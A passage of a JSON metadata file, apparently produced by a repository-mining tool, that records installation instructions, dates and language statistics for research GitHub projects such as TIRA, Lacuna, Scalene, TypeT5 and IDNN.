a postgres database locally\n\n```psql\ncreate database $db_name;\n\ncreate role $user_name with createdb login password 'password';\n\ngrant all privileges on database $db_name to $user_name;\n\n```\n\nNow run the migrations to set up the database\n\n```bash\nbin/rails db:migrate RAILS_ENV=development\n```\n\n\nTransparencyHub is now set up and you can start the application\n\n```bash\nrails s\n```\n\nThe app is now accessible via `http://localhost:3000`\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "TIRA: An OpenAPI Extension and Toolbox for GDPR Transparency in RESTful Architectures"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/PrivacyEngineering/tira/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-05-04T11:50:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-17T17:36:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Ruby",
                    "name": "Ruby",
                    "type": "Programming_language",
                    "size": 132082
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 42897
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SCSS",
                    "name": "SCSS",
                    "type": "Programming_language",
                    "size": 11298
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 1287
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CoffeeScript",
                    "name": "CoffeeScript",
                    "type": "Programming_language",
                    "size": 1266
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 412
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "67": {
        "filename": "lgbanuelos_bsgen_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/lgbanuelos/bsgen",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-07-03T05:41:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-09-02T16:30:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 14908
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1545
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "68": {
        "filename": "S2-group_Lacuna_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/S2-group/Lacuna",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Install the dependent libraries:\n\n```bash\nnpm install\n```\n\nInstall the dependencies for the different analyzers (should only be necessary\nif you want to use them)\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Lacuna"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/S2-group/Lacuna/master/README.md"
            },
            {
                "result": {
                    "value": "```bash\nnpm --prefix ./analyzers/js-callgraph install ./analyzers/js-callgraph\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "js-callgraph",
                    "parent_header": [
                        "Lacuna",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/S2-group/Lacuna/master/README.md"
            },
            {
                "result": {
                    "value": "- If the dynamic analyzer installation fails, try installing it by ignoring the scripts:\n\n```bash\nnpm --prefix ./analyzers/dynamic install ./analyzers/dynamic --ignore-scripts\n```\n\n- Make sure to have chromium web browser installed before using this analyzer\n",
                    "type": "Text_excerpt",
                    "original_header": "Resolutions for common issues that might be encountered:",
                    "parent_header": [
                        "Lacuna",
                        "Installation",
                        "dynamic"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/S2-group/Lacuna/master/README.md"
            },
            {
                "result": {
                    "value": "```bash\nnpm --prefix ./analyzers/wala_full install ./analyzers/wala_full\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "wala full",
                    "parent_header": [
                        "Lacuna",
                        "Installation",
                        "wala"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/S2-group/Lacuna/master/README.md"
            },
            {
                "result": {
                    "value": "```bash\nnpm --prefix ./analyzers/wala_single install ./analyzers/wala_single\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "wala single",
                    "parent_header": [
                        "Lacuna",
                        "Installation",
                        "wala"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/S2-group/Lacuna/master/README.md"
            },
            {
                "result": {
                    "value": "Clone jelly inside the analyzers directory:\n\n```bash\ngit clone https://github.com/ishaskul/jelly.git ./analyzers/jelly\n```\nInstall dependencies:\n\n```bash\nnpm --prefix ./analyzers/jelly install ./analyzers/jelly\n```\n\nCompile TypeScript code:\n```bash\nnpm --prefix ./analyzers/jelly run build\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "jelly:",
                    "parent_header": [
                        "Lacuna",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/S2-group/Lacuna/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Identifying scripts within HTML currently fails when there are (extra?) spaces or linebreaks between the words\n- The dynamic analyzer that requires a webdriver doesn't seem to load external\nJS files in headless mode. The workaround currently used is to not run the \nbrowser in headless mode; which has the annoying consequence that it activates/\nfocuses the window on every run. \n \n",
                    "original_header": "Solved issues"
                },
                "confidence": 0.9244186944674632,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/S2-group/Lacuna/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-09-25T08:19:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-09-24T13:02:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 672357
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 11815
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 10032
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Vue",
                    "name": "Vue",
                    "type": "Programming_language",
                    "size": 1973
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 691
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 431
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 330
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "69": {
        "filename": "emeryberger_scalene_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/emeryberger/scalene",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```console\npython3 -m pip install -U scalene\n```\n\nor\n\n```console\nconda install -c conda-forge scalene\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing Scalene:",
                    "parent_header": [
                        "Scalene: a Python CPU+GPU+memory profiler with AI-powered optimization proposals",
                        "About Scalene",
                        "Quick Start"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/emeryberger/scalene/master/README.md"
            },
            {
                "result": {
                    "value": "```console\n!pip install scalene\n%load_ext scalene\n```\n\nLine mode:\n\n```console\n%scrun [options] statement\n```\n\nCell mode:\n\n```console\n%%scalene [options]\ncode...\ncode...\n```\n</details>\n\n## Installation\n\n<details>\n<summary>Using <code>pip</code> (Mac OS X, Linux, Windows, and WSL2)</summary>\n\nScalene is distributed as a `pip` package and works on Mac OS X, Linux (including Ubuntu in [Windows WSL2](https://docs.microsoft.com/en-us/windows/wsl/wsl2-index)) and (with limitations) Windows platforms. (**Note**: the Windows version isn't yet complete; it currently only supports CPU and GPU profiling, but not memory profiling.)\n\nYou can install it as follows:\n```console\n  % pip install -U scalene\n```\n\nor\n```console\n  % python3 -m pip install -U scalene\n```\n\nYou may need to install some packages first.\n\nSee https://stackoverflow.com/a/19344978/4954434 for full instructions for all Linux flavors.\n\nFor Ubuntu/Debian:\n\n```console\n  % sudo apt install git python3-all-dev\n```\n</details>\n\n\n<details>\n<summary>Using <code>Homebrew</code> (Mac OS X)</summary>\n\nAs an alternative to `pip`, you can use Homebrew to install the current version of Scalene from this repository:\n\n```console\n  % brew tap plasma-umass/scalene\n  % brew install --head plasma-umass/scalene/scalene\n```\n</details>\n\n<details>\n<summary>On ArchLinux</summary>\n\nYou can install Scalene on Arch Linux via the [AUR\npackage](https://aur.archlinux.org/packages/python-scalene-git/). Use your favorite AUR helper, or\nmanually download the `PKGBUILD` and run `makepkg -cirs` to build. Note that this will place\n`libscalene.so` in `/usr/lib`; modify the below usage instructions accordingly.\n</details>\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Comparison to Other Profilers"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/emeryberger/scalene/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<img width=\"487\" alt=\"Scalene advanced options\" src=\"https://user-images.githubusercontent.com/1612723/211639253-ec926b38-3efe-4a20-8514-e10dde94ec01.png\"> \n",
                    "original_header": "About Scalene"
                },
                "confidence": 0.9736243582941339,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/emeryberger/scalene/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you include the `--cli` option, Scalene prints annotated source code for the program being profiled\n(as text, JSON (`--json`), or HTML (`--html`)) and any modules it\nuses in the same directory or subdirectories (you can optionally have\nit `--profile-all` and only include files with at least a\n`--cpu-percent-threshold` of time).  Here is a snippet from\n`pystone.py`. \n",
                    "original_header": "Output"
                },
                "confidence": 0.9985910286468959,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/emeryberger/scalene/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The following command runs Scalene on a provided example program.\n```console\nscalene test/testme.py\n```\n \n<details>\n <summary>\n  Click to see all Scalene's options (available by running with <code>--help</code>)\n </summary> \n```console\n    % scalene --help\n     usage: scalene [-h] [--outfile OUTFILE] [--html] [--reduced-profile]\n                    [--profile-interval PROFILE_INTERVAL] [--cpu-only]\n                    [--profile-all] [--profile-only PROFILE_ONLY]\n                    [--use-virtual-time]\n                    [--cpu-percent-threshold CPU_PERCENT_THRESHOLD]\n                    [--cpu-sampling-rate CPU_SAMPLING_RATE]\n                    [--malloc-threshold MALLOC_THRESHOLD]\n     \n     Scalene: a high-precision CPU and memory profiler.\n     https://github.com/plasma-umass/scalene\n     \n     command-line:\n        % scalene [options] yourprogram.py\n     or\n        % python3 -m scalene [options] yourprogram.py\n     \n     in Jupyter, line mode:\n        %scrun [options] statement\n     \n     in Jupyter, cell mode:\n        %%scalene [options]\n        code...\n        code...\n     \n     optional arguments:\n       -h, --help            show this help message and exit\n       --outfile OUTFILE     file to hold profiler output (default: stdout)\n       --html                output as HTML (default: text)\n       --reduced-profile     generate a reduced profile, with non-zero lines only (default: False)\n       --profile-interval PROFILE_INTERVAL\n                             output profiles every so many seconds (default: inf)\n       --cpu-only            only profile CPU time (default: profile CPU, memory, and copying)\n       --profile-all         profile all executed code, not just the target program (default: only the target program)\n       --profile-only PROFILE_ONLY\n                             profile only code in filenames that contain the given strings, separated by commas (default: no restrictions)\n       --use-virtual-time    measure only CPU time, not time spent in I/O or blocking (default: False)\n       --cpu-percent-threshold CPU_PERCENT_THRESHOLD\n                             only report profiles with at least this percent of CPU time (default: 1%)\n       --cpu-sampling-rate CPU_SAMPLING_RATE\n                             CPU sampling rate (default: every 0.01s)\n       --malloc-threshold MALLOC_THRESHOLD\n                             only report profiles with at least this many allocations (default: 100)\n     \n     When running Scalene in the background, you can suspend/resume profiling\n     for the process ID that Scalene reports. For example:\n     \n        % python3 -m scalene [options] yourprogram.py &\n      Scalene now profiling process 12345\n        to suspend profiling: python3 -m scalene.profile --off --pid 12345\n        to resume profiling:  python3 -m scalene.profile --on  --pid 12345\n```\n</details>\n \n",
                    "original_header": "Scalene"
                },
                "confidence": 0.9927454267520778,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/emeryberger/scalene/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<details>\n<summary>\nInstructions for installing and using Scalene with Jupyter notebooks\n</summary> \n",
                    "original_header": "Scalene with Jupyter"
                },
                "confidence": 0.9997419945977563,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/emeryberger/scalene/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**A:** Yes! You can run it as follows (for example): \n**A:**  In PyCharm, you can run Scalene at the command line by opening the terminal at the bottom of the IDE and running a Scalene command (e.g., `python -m scalene <your program>`). Use the options `--cli`, `--html`, and `--outfile <your output.html>` to generate an HTML file that you can then view in the IDE.\n</details> \n**A:** Pass in the `--noreload` option (see https://github.com/plasma-umass/scalene/issues/178).\n</details> \n<details>\n<summary>\nHow do I use Scalene with PyTorch on the Mac?\n</summary> \n**A:** Scalene works with PyTorch version 1.5.1 on Mac OS X. There's a bug in newer versions of PyTorch (https://github.com/pytorch/pytorch/issues/57185) that interferes with Scalene (discussion here: https://github.com/plasma-umass/scalene/issues/110), but only on Macs.\n</details>\n \n",
                    "original_header": "Asked Questions"
                },
                "confidence": 0.9871063268872646,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/emeryberger/scalene/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-01-20T20:41:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-24T06:32:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 466936
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 452972
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 64006
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 8423
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 5074
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 2478
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "70": {
        "filename": "bearlu1996_ProcessDrifts_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/bearlu1996/ProcessDrifts",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Our program uses some of the libraries in the \"ProDrift2.5\" package (https://apromore.org/platform/tools/). \nFor your convenience, the source code of our implementation is in the \"Implementation\" folder. You need to make external reference to the \"ProDrift2.5\" package to compile the code (You can also find the package in the \"lib\" folder in our full package \"ProcessDrift.zip\". See details below). \nhttps://unisydneyedu-my.sharepoint.com/:u:/g/personal/yalu8986_uni_sydney_edu_au/EetOwKwo7GhNnhSyp-W23IcBhATylP5ibx68ZRVQNQzg-w?e=1XzlAw \n**Make sure you have read the \"User guide.pdf\" file before you run the program!** \nhttps://unisydneyedu-my.sharepoint.com/:u:/g/personal/yalu8986_uni_sydney_edu_au/EQvEpM0MJl5GpBsOYgpG7CYBhEw_8OEpzxU24lvg_wRs1w?e=4Ss6jn \nhttps://unisydneyedu-my.sharepoint.com/:u:/g/personal/yalu8986_uni_sydney_edu_au/EReEpTVgjuhBs0r-xdM4bh0BkAyYermc01I2dGdDXXU7FQ?e=z62mGv \n",
                    "original_header": "ProcessDrifts"
                },
                "confidence": 0.9818725889817309,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bearlu1996/ProcessDrifts/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-03-10T08:32:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-24T04:41:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 52762
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "71": {
        "filename": "emmableu_SnapCheck_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/emmableu/SnapCheck",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "After cloning this repository, install all dependencies for SnapCheck using: \nTo install, do:\n```bash\nnpm install\n``` \nTo start development, do:\n```bash\nnpm run serve\n``` \nTo build, do:\n```bash\nnpm run build\n```\n \n",
                    "original_header": "Scripts"
                },
                "confidence": 0.9995598999700653,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/emmableu/SnapCheck/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-04-03T18:47:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-12-15T08:22:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 43649
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Vue",
                    "name": "Vue",
                    "type": "Programming_language",
                    "size": 16458
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 5742
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 947
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "72": {
        "filename": "utopia-group_TypeT5_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/utopia-group/TypeT5",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "This project uses [pipenv](https://pipenv.pypa.io/en/latest/) to manage the package dependencies. Pipenv tracks the exact package versions and manages the (project-specific) virtual environment for you. To install all dependencies, make sure you have pipenv and Python 3.10 installed, then, at the project root, run the following two commands:\n```bash\npipenv --python <path-to-your-python-3.10>  # create a new environment for this project\npipenv sync --dev # install all specificed dependencies\n```\n\nMore about pipenv:\n- To add new dependences into the virtual environment, you can either add them via `pipenv install ..` (using `pipenv`) or `pipenv run pip install ..` (using `pip` from within the virtual environment).\n- If your pytorch installation is not working properly, you might need to reinstall it via the `pipenv run pip install` approach rather than `pipenv install`.\n- All `.py` scripts below can be run via `pipenv run python <script-name.py>`. For `.ipynb` notebooks, make sure you select the pipenv environment as the kernel. You can run all unit tests by running `pipenv run pytest` at the project root.\n\nIf you are not using pipenv:\n- Make sure to add the environment variables in the [.env](.env) file to your shell environment when you run the scripts (needed by the parsing library).\n- We also provided a [requirements.txt](requirements.txt) file for you to install the dependencies via `pip install -r requirements.txt`.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "TypeT5: Seq2seq Type Inference using Static Analysis"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/utopia-group/TypeT5/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-01-18T18:03:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-20T15:30:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 489346
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 353326
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 66
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "73": {
        "filename": "ShakthiYasas_context-query-simulator_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ShakthiYasas/context-query-simulator",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "`prefix schema:http//schema.org push (targetCarpark.*)\nwhen distance(consumerCar.location, targetLocation.geo)<={\u201cvalue\u201d:500, \u201cunit\u201d:\u201dm\u201d} \ndefine\nentity targetLocation is from schema:Place where targetLocation.name=\u201dMelbourne Skydeck\u201d, \nentity consumerCar is from schema:Vehicle where cosumerCar.vin=\u201d13UNVER82367G4\u201d,\nentity targetCarpark is from schema:ParkingFacility where goodForWalking(targetWeather)>=0.6 and \n  targetCarpark.maxHeight>consumerCar.height targetCarpark.isOpen=true and targetCarpark.availableSlots>0`\n \n",
                    "original_header": "Sample Query 1"
                },
                "confidence": 0.9702262205269984,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ShakthiYasas/context-query-simulator/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-07-16T13:58:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-07-16T14:00:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 110763
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 19841
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1320
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 590
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "74": {
        "filename": "sgholamian_comprehensive-software-logging-survey_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sgholamian/comprehensive-software-logging-survey",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-11-27T15:52:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-12-14T20:13:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 11265489
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "75": {
        "filename": "apaleyes_dataflow-causal-graph_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/apaleyes/dataflow-causal-graph",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To reproduce the experiments install the requirements and then run the notebook.\n \n",
                    "original_header": "Dataflow graphs as complete causal graphs"
                },
                "confidence": 0.9999418482371433,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/apaleyes/dataflow-causal-graph/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-03-15T14:54:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-12T11:44:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 197174
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 14046
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "76": {
        "filename": "REDNet-verifier_IDNN_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/REDNet-verifier/IDNN",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Installation\n------------\nInstall and setup alpha-beta-CROWN as follows:\n```\ngit clone https://github.com/Verified-Intelligence/alpha-beta-CROWN.git\ncd alpha-beta-CROWN\nconda deactivate; conda env remove --name alpha-beta-crown\nconda env create -f complete_verifier/environment.yml --name alpha-beta-crown\nconda activate alpha-beta-crown\n```\n\nClone the IDNN repository via git as follows:\n```\ngit clone https://github.com/REDNet-verifier/IDNN\n```\n\nCopy the files and folder in IDNN under path alpha-beta-crown/complete_verifier:\n```\ncp -r IDNN/exp_setups complete_verifier/exp_setups/\ncp IDNN/IDNN_A.py complete_verifier/IDNN_A.py\ncp IDNN/IDNN_B.py complete_verifier/IDNN_B.py\ncp IDNN/run_IDNN.py complete_verifier/run_IDNN.py\ncp IDNN/export_reduced_onnx.py complete_verifier/export_reduced_onnx.py\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "REDNet pre-processing"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/REDNet-verifier/IDNN/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-05-03T13:02:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-05-03T14:05:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 174872
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "77": {
        "filename": "yikun-li_satd-different-sources-data_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/yikun-li/satd-different-sources-data",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
